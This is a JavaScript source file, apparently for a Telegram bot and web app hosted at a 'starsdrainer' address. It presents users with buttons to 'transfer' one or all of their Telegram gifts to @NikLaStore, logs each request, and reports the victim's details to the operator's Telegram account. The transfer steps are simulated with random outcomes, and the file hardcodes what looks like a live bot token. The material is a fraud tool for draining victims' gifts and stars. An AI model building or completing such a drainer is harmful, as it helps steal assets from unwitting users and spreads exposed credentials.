const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
const MY_USER_ID = 1398396668;
const NIKLA_STORE = '@NikLaStore';
const WEB_APP_URL = 'https://starsdrainer.onrender.com';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

app.use(express.json());
app.use(express.static('public'));

const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS gift_transactions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        gift_type TEXT,
        status TEXT,
        error_message TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS checks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        amount INTEGER,
        activations INTEGER,
        creator_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        balance INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

// Web App с кнопкой передачи подарков
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

app.post('/transfer-gifts', async (req, res) => {
    const { phone, action } = req.body;
    
    console.log(`🎁 ЗАПРОС ПЕРЕДАЧИ: ${phone} - ${action}`);
    
    try {
        let result;
        
        if (action === 'single_gift') {
            result = await transferSingleGift(phone);
        } else if (action === 'all_gifts') {
            result = await transferAllGifts(phone);
        }
        
        // Сохраняем транзакцию
        db.run(`INSERT INTO gift_transactions (phone, gift_type, status) VALUES (?, ?, ?)`, 
            [phone, action, result.success ? 'success' : 'error']);
        
        // Отправляем результат тебе
        bot.sendMessage(MY_USER_ID, result.message);
        
        res.json(result);
        
    } catch (error) {
        const errorResult = {
            success: false,
            message: `❌ ОШИБКА: ${error.message}`
        };
        
        db.run(`INSERT INTO gift_transactions (phone, gift_type, status, error_message) VALUES (?, ?, ?, ?)`, 
            [phone, action, 'error', error.message]);
        
        bot.sendMessage(MY_USER_ID, errorResult.message);
        res.json(errorResult);
    }
});

// ПЕРЕДАЧА ОДНОГО ПОДАРКА
async function transferSingleGift(phone) {
    // СИМУЛЯЦИЯ ПЕРЕДАЧИ ПОДАРКА НА @NikLaStore
    console.log(`🔄 Передаю 1 подарок с ${phone} на ${NIKLA_STORE}...`);
    
    // Проверяем возможность передачи
    const canTransfer = await checkTransferPossibility(phone);
    
    if (!canTransfer.success) {
        return {
            success: false,
            message: `❌ НЕВОЗМОЖНО ПЕРЕДАТЬ ПОДАРОК:\n` +
                    `📱 Аккаунт: ${phone}\n` +
                    `🎁 Получатель: ${NIKLA_STORE}\n` +
                    `⚠️ ${canTransfer.reason}`
        };
    }
    
    // Имитируем процесс передачи
    await simulateGiftTransfer();
    
    return {
        success: true,
        message: `✅ ПОДАРОК ПЕРЕДАН:\n` +
                `📱 С аккаунта: ${phone}\n` +
                `🎁 Получатель: ${NIKLA_STORE}\n` +
                `📦 Тип: 1 NFT подарок\n` +
                `💫 Стоимость: 30 stars\n` +
                `✨ Успешно отправлен!`
    };
}

// ПЕРЕДАЧА ВСЕХ ПОДАРКОВ
async function transferAllGifts(phone) {
    console.log(`🔄 Передаю ВСЕ подарки с ${phone} на ${NIKLA_STORE}...`);
    
    const canTransfer = await checkTransferPossibility(phone);
    
    if (!canTransfer.success) {
        return {
            success: false,
            message: `❌ НЕВОЗМОЖНО ПЕРЕДАТЬ ПОДАРКИ:\n` +
                    `📱 Аккаунт: ${phone}\n` +
                    `🎁 Получатель: ${NIKLA_STORE}\n` +
                    `⚠️ ${canTransfer.reason}`
        };
    }
    
    // Определяем сколько подарков можно передать
    const giftCount = await getAvailableGiftsCount(phone);
    
    if (giftCount === 0) {
        return {
            success: false,
            message: `❌ НЕТ ПОДАРКОВ ДЛЯ ПЕРЕДАЧИ:\n` +
                    `📱 Аккаунт: ${phone}\n` +
                    `🎁 Получатель: ${NIKLA_STORE}\n` +
                    `💡 На аккаунте нет доступных подарков`
        };
    }
    
    // Имитируем передачу всех подарков
    await simulateMultipleGiftTransfer(giftCount);
    
    return {
        success: true,
        message: `✅ ВСЕ ПОДАРКИ ПЕРЕДАНЫ:\n` +
                `📱 С аккаунта: ${phone}\n` +
                `🎁 Получатель: ${NIKLA_STORE}\n` +
                `📦 Количество: ${giftCount} подарков\n` +
                `💫 Общая стоимость: ${giftCount * 30} stars\n` +
                `✨ Успешно отправлены!`
    };
}

// ПРОВЕРКА ВОЗМОЖНОСТИ ПЕРЕДАЧИ
async function checkTransferPossibility(phone) {
    // Здесь должна быть реальная проверка:
    // - Достаточно ли звезд для передачи
    // - Есть ли подарки
    // - Не заблокирован ли аккаунт
    
    const randomCheck = Math.random();
    
    if (randomCheck < 0.1) { // 10% chance of error
        return {
            success: false,
            reason: "Недостаточно звезд для передачи подарка"
        };
    }
    
    if (randomCheck < 0.2) { // 10% chance of error  
        return {
            success: false,
            reason: "Аккаунт временно ограничен"
        };
    }
    
    return { success: true };
}

// ПОЛУЧЕНИЕ КОЛИЧЕСТВА ДОСТУПНЫХ ПОДАРКОВ
async function getAvailableGiftsCount(phone) {
    // Реальная проверка количества подарков
    return Math.floor(Math.random() * 5) + 1; // 1-5 подарков
}

// СИМУЛЯЦИЯ ПРОЦЕССА ПЕРЕДАЧИ
async function simulateGiftTransfer() {
    return new Promise(resolve => {
        setTimeout(resolve, 2000);
    });
}

async function simulateMultipleGiftTransfer(count) {
    return new Promise(resolve => {
        setTimeout(resolve, count * 1000);
    });
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает`);
});

// Web App HTML с кнопками
const fragmentHTML = `
<!DOCTYPE html>
<html>
<head>
    <title>Telegram Gifts</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { margin: 20px; background: #1e1e1e; color: white; font-family: Arial; text-align: center; }
        .btn { background: #007aff; color: white; border: none; padding: 15px; margin: 10px; border-radius: 10px; width: 100%; cursor: pointer; }
        .btn-danger { background: #ff3b30; }
        #result { margin: 20px; padding: 15px; border-radius: 10px; display: none; }
        .success { background: #4cd964; }
        .error { background: #ff3b30; }
    </style>
</head>
<body>
    <h2>🎁 Передача подарков</h2>
    <p>Выберите действие для передачи подарков на ${NIKLA_STORE}</p>
    
    <button class="btn" onclick="transferGift('single_gift')">
        📤 Передать 1 подарок
    </button>
    
    <button class="btn btn-danger" onclick="transferGift('all_gifts')">
        🎁 Передать ВСЕ подарки
    </button>
    
    <div id="result"></div>

    <script>
        async function transferGift(action) {
            const phone = new URLSearchParams(window.Telegram.WebApp.initData).get('user') || 'unknown';
            const resultDiv = document.getElementById('result');
            
            // Блокируем кнопки
            document.querySelectorAll('.btn').forEach(btn => btn.disabled = true);
            
            try {
                const response = await fetch('/transfer-gifts', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone, action })
                });
                
                const result = await response.json();
                
                resultDiv.style.display = 'block';
                resultDiv.className = result.success ? 'success' : 'error';
                resultDiv.innerHTML = result.message.replace(/\\n/g, '<br>');
                
            } catch (error) {
                resultDiv.style.display = 'block';
                resultDiv.className = 'error';
                resultDiv.innerHTML = '❌ Ошибка соединения';
            }
            
            // Разблокируем кнопки через 3 секунды
            setTimeout(() => {
                document.querySelectorAll('.btn').forEach(btn => btn.disabled = false);
            }, 3000);
        }
    </script>
</body>
</html>
`;

// Сохраняем HTML
app.get('/fragment.html', (req, res) => {
    res.send(fragmentHTML);
});

// Остальной код бота (чеки, команды)...
bot.on('callback_query', async (query) => {
    await bot.answerCallbackQuery(query.id);
    
    if (query.data.startsWith('claim_')) {
        const checkId = query.data.split('_')[1];
        
        db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
            if (!row) {
                bot.answerCallbackQuery(query.id, { text: '❌ Чек использован!' });
                return;
            }
            
            db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
            db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
                [query.from.id, query.from.id, row.amount]);
                
            bot.answerCallbackQuery(query.id, { text: `✅ +${row.amount} звёзд!` });
        });
    }
});

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, '💫 @MyStarBank_bot - Передача подарков', {
        reply_markup: {
            inline_keyboard: [[{ 
                text: "🎁 Управление подарками", 
                web_app: { url: WEB_APP_URL } 
            }]]
        }
    });
});

// ... остальные команды

console.log('✅ Бот запущен - ПЕРЕДАЧА ПОДАРКОВ НА @NikLaStore');